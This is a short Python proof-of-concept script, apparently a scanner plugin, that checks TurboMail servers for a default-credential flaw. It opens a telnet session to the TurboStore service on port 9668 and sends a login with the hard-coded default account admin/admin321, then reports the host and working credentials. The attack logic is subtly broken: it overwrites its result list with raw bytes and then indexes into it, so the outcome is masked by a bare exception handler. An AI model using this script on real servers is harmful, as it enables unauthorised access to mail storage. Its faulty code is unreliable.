#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TurboMail设计缺陷以及默认配置漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0176317
author: Lucifer
description: Turbomail安装完毕后会有多个应用打开端口监听数据,其中有一个叫做TurboStore是用于存储邮件信息的的核心组件。
        TurboStore打开9668端口，默认口令admin/admin321可成功登陆导致进一步渗透。
'''
import sys
import warnings
import telnetlib

from urllib.parse import urlparse

class turbomail_conf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['TurboMail设计缺陷以及默认配置漏洞', '', '']
        port = 9668
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            if self.url.find(":") >= 0:
                host = self.url.split(":")[0]
                port = int(self.url.split(":")[1])
            else:
                host = self.url

        try:
            #连接Telnet服务器
            tlib = telnetlib.Telnet(host, port, timeout=6)
            #tlib.set_debuglevel(2)
            #登陆
            tlib.write(b"login admin admin321\r\n")
            result = tlib.read_until(b"200 login successfully\r\n", timeout=6)
            tlib.close()
            if result.find(b"200 login successfully") is not -1:
                result[2] = '存在'
                result[1]=host+":"+str(port)+" admin:admin321"
            else:
                result[2] = '不存在'

        except:
            result[2] = '未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = turbomail_conf_BaseVerify(sys.argv[1])
    testVuln.run()
